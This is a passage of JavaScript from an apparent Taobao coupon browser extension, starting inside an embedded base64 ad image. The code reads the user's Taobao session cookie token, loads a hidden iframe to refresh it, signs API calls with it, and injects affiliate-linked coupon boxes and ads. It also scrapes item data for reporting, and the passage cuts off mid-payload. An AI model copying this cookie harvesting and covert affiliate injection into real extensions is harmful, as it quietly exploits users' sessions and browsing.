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';
            var toUrl = 'https://s.click.taobao.com/OefKSPw';
            var clickE = '无券广告';
            //没有优惠券时中间的广告图和跳转地址以及cnzz点击事件名称
            function getTbCookie(call,pid,page,num,callBack) {
                chrome.extension.sendMessage({
                    name:"getCook",url:"https://www.taobao.com/",key:"_m_h5_tk"
                },function (d) {
                    if (d && d[0] && d[0].value) {
                        tbCookie = d[0].value;
                        call(pid,page,num,callBack);
                    } else {
                        $("body").append(`<iframe src="//h5.m.taobao.com/" id="douya-yangxue9527" style="display:none"></iframe>`);
                        setTimeout(function () {
                            $("#douya-yangxue9527").remove();
                            getTbCookie(call,pid,page,num,callBack)
                        },2000);
                    }
                });
            }     // 获取淘宝cookie
            getTbCookie(startCou);
            function startCou() {
                var page = 1;           //接口参数页码数
                var getH5CouNum = 0;    //接口轮询调用次数
                var page1 = 1;
                var getH5CouNum1 = 0;//
                var page2 = 1;
                var getH5CouNum2 = 0;//
                function getDan(pid,page,num,callBack) {
                    var time = Date.now();
                    var s = `{"q":"${sj_title}","pid":"${pid}","page":${page},"useItemCouponPage":"1","lunaUrlParam": "{'algo_sort':'mixcoupon','rank':'rank_profile:FirstRankScorer_atbh5','PS':'tk_item_score_atbh5','appBucket':'h'}"}`;
                    chrome.extension.sendMessage({
                        url:"https://acs.m.taobao.com/h5/mtop.aitaobao.item.search/7.0/",
                        data:{
                            v:"7.0",api:"mtop.aitaobao.item.search",appKey:"12574478",t:time,sign:md5(tbCookie.split("_")[0] + "&" + time + "&12574478&" + s),data:s
                        },
                        type:"get",dataType:"json",name:"universal"
                    },function (r) {
                        if (r && r.ret && r.ret[0] && r.ret[0].match("调用成功")) {
                            if (r && r.data && r.data.items && r.data.items.length) {
                                var data = r.data.items;
                                var hasSwi = 1;
                                $.each(data,function (v,k) {
                                    if (k.nid == sj_id) {
                                        if (k.couponAmount) {
                                            callBack(k,'has');    //有相应优惠券
                                        } else {
                                            callBack(k,'no');    //有对应id数据但无优惠券的
                                        }
                                        hasSwi = 0;
                                        return false;
                                    }
                                });
                                if (hasSwi) {
                                    if (page == 3) {
                                        callBack(0,'err');        //数据没对应ID,可能没有推广,可能前面3页都没数据,不知道是否有优惠券
                                        return false
                                    } else {
                                        page++;
                                        getDan(pid,page,num,callBack);
                                    }
                                }
                            } else {
                                callBack(0,'no');    //搜索无任何数据,没有优惠券
                            }
                        } else {
                            num++;
                            if (num == 3) {
                                callBack(0,'err');    //请求失败的,不知道是否有优惠券
                                return false
                            } else {
                                getTbCookie(getDan,pid,page,num,callBack);
                            }
                        }
                    });
                }   //
                function setCoupon(list,type) {
                    var qrcodeText = "https://item.taobao.com/item.htm?id=" + sj_id;
                    if (type == 'has') {
                        qrcodeText = "https://uland.taobao.com/coupon/edetail" + "?e=" + getParam(list["clickUrl"],"e");
                        var html = `<div class="plugMid627-couBox">
                            <div>
                                <div class="plugMid627-couPrice">券后价 <span>¥${sub(list.discountPrice,list.couponAmount / 100)}</span></div>
                                <div class="plugMid627-couTime" data-endtime=""></div>
                            </div>
                            <div class="plugMid627-couBack" data-mgClick="领取优惠券">
                                <div class="plugMid627-couAmount">${list.couponAmount / 100}元券</div>
                                <div class="plugMid627-couNeed"></div>
                            </div>
                            <div class="plugMid627-couEmpty"></div>
                            <div class="plugMid627-couQr">
                                <div class="plugMid627-couQr-icon"></div>
                                <div class="plugMid627-couQr-title">手淘领券</div>
                                <div class="plugMid627-couQr-box">
                                    <div class="plugMid627-couQr-drop">
                                        <div id="plugMid627-couQr"></div>
                                        <div class="">手淘扫码领券<br>商品<span>立减${list.couponAmount / 100}元</span></div>
                                    </div>  
                                </div>
                            </div>
                        </div>`;
                        $(".plugMid627-hasCoupon").html(html);
                        $(".plugMid627-hasCoupon").show();
                        $(".plugMid627-couBack").click(function () {
                            openWindow(qrcodeText);
                        });
                        var conponE = getParam(list.clickUrl,"e");//优惠券E参数
                        var getH5CouNum3 = 0;//
                        var num = 0;    //
                        var resdata = {};   //
                        function saveCount() {
                            num++;
                            if (num == 2) {
                                saveCou(list,resdata);
                            }
                        }   //
                        function getCouponInfo() {
                            var time = Date.now();
                            var s = `{"e":"${conponE}","pid":"${myPostMmId}"}`;
                            chrome.extension.sendMessage({
                                url:"https://acs.m.taobao.com/h5/mtop.alimama.union.hsf.coupon.get/1.0/",
                                data:{
                                    jsv:"2.4.0",v:"1.0",api:"mtop.alimama.union.hsf.coupon.get",appKey:"12574478",t:time,AntiCreep:true,AntiFlood:true,
                                    sign:md5(tbCookie.split("_")[0] + "&" + time + "&12574478&" + s),data:s
                                },
                                type:"get",dataType:"json",name:"universal"
                            },function (r) {
                                if (r && r.ret && r.ret[0] && r.ret[0].match("调用成功")) {
                                    if (r && r.data && r.data.result) {
                                        resdata.data = r.data.result;
                                        var ntime = new Date(resdata.data["effectiveEndTime"]);
                                        ntime = Math.floor(ntime.getTime() / 1000);
                                        $(".plugMid627-couNeed").html(`满${resdata.data.startFee}减${resdata.data.amount}`);
                                        $(".plugMid627-couTime").attr("data-endtime",ntime);
                                        opTimer(".plugMid627-couTime");
                                        saveCount()
                                    }
                                } else {
                                    getH5CouNum3++;
                                    if (getH5CouNum3 == 3) {
                                        $(".plugMid627-couNeed").html(`无门槛`);
                                        return false
                                    } else {
                                        getTbCookie(getCouponInfo);
                                    }
                                }
                            });
                        }//
                        getCouponInfo();
                        chrome.extension.sendMessage({
                            name:"universal",
                            url:tblmUrl + "?q=https://item.taobao.com/item.htm?id=" + sj_id,
                            type:"get",
                        },function (res) {
                            if (res["data"] && res["data"]["pageList"]) {
                                resdata.couponTotalCount = res["data"]["pageList"][0].couponTotalCount;
                                resdata.couponLeftCount = res["data"]["pageList"][0].couponLeftCount;
                            }
                            saveCount()
                        });
                        getDan(myQrMmId,page1,getH5CouNum1,setQrCoupon);
                    } else {
                        $(".plugMid627-noCoupon").html(`<img src="${adPic}" data-mgClick="${clickE}">`);
                        $(".plugMid627-noCoupon").show();
                        $(".plugMid627-noCoupon").click(function () {
                            openWindow(toUrl);
                        });
                        if (type == 'no') {
                            saveCou(0,0);
                        }
                    }
                }       //生成优惠券判断是否有优惠券
                function setQrCoupon(list,type) {
                    var qrcodeText = "https://item.taobao.com/item.htm?id=" + sj_id;
                    if (list) {
                        if (type == 'has') {
                            qrcodeText = "https://uland.taobao.com/coupon/edetail?e=" + getParam(list["clickUrl"],"e");
                        } else {
                            qrcodeText = "https://s.click.taobao.com/t?e=" + getParam(list["clickUrl"],"e");
                        }
                    }
                    //生成二维码
                    new QRCode($("#plugMid627-couQr")[0],{
                        text:qrcodeText,
                        width:120,
                        height:120,
                        colorDark:"#000000",
                        colorLight:"#ffffff",
                        correctLevel:QRCode.CorrectLevel.L
                    });
                    $("#plugMid627-couQr").attr("title","");
                    $(".plugMid627-couQr").hover(
                        function () {
                            $(".plugMid627-couQr-box").show(0,function () {
                                $(".plugMid627-couQr-drop").addClass("show");
                            });
                        },
                        function () {
                            $(".plugMid627-couQr-drop").removeClass("show");
                        }
                    );
                    $(".plugMid627-couQr-drop")[0].addEventListener('transitionend',function () {
                        var left = $(".plugMid627-couQr-drop").css("transform").replace(/[^0-9\-,]/g,'').split(',')[4];
                        if (left == "-158") {
                            $(".plugMid627-couQr-box").hide();
                        }
                    },false)
                }     //生成优惠券二维码
                function saveCou(list,res) {
                    var hasPostArr = [];    //已经上报过的优惠券ID
                    function delTime() {
                        var day = 7;
                        var time = new Date().getTime() - day * 86400000;
                        for (let i = hasPostArr.length - 1; i >= 0; i--) {
                            if (hasPostArr[i].time < time) {
                                hasPostArr.splice(i,1);
                            }
                        }
                        chrome.storage.local.set({postCou180711:hasPostArr});
                    }   //删除事件超过7天的优惠券id
                    function postCou(list,type) {
                        var rCat = $('html').html().match(/"rootCatId":"(\d+)",/) ? $('html').html().match(/"rootCatId":"(\d+)",/)[1] : ($('html').html().match(/(\s+)rcid(\s+):(\s+)'(\d+)'/) ? $('html').html().match(/(\s+)rcid(\s+):(\s+)'(\d+)'/)[4] : "");
                        var action = 'cp_bogus';
                        var goodRate = "";
                        if (type == 'err') {
                            return
                        }
                        var postData = {
                            itemId:sj_id
                        };  //
                        $.ajax({
                            url:"https://rate.taobao.com/detailCommon.htm?auctionNumId=" + sj_id,
                            type:"get",
                            dataType:"html",
                            success:function (d) {
                                d = trim(d);
                                d = d.substr(1,d.length - 2);
                                try {
                                    d = JSON.parse(d);
                                    goodRate = d.data.count.total ? (d.data.count.good / d.data.count.total * 100).toFixed(2) : 0;
                                } catch (err) {
                                }
                            },
                            complete:function () {
                                startPost();
                            }
                        }); //获取好评率
                        function startPost() {
                            if (type == "has") {
                                action = 'cp_effec';
                                var aliData = res.data;
                                var pintai = (list.userType == 1) ? 2 : 1;
                                postData = {
                                    itemId:aliData ? aliData.item.itemId : sj_id,
                                    title:aliData ? aliData.item.title : sj_title,
                                    category:rCat,
                                    discountPrice:aliData ? aliData.item.discountPrice : list.discountPrice,
                                    reservePrice:aliData ? aliData.item.reservePrice : list.reservePrice,
                                    picUrl:aliData ? aliData.item.picUrl : list.pictUrl,
                                    effectiveStartTime:aliData ? aliData.effectiveStartTime.split(" ")[0] : "",
                                    effectiveEndTime:aliData ? aliData.effectiveEndTime.split(" ")[0] : "",
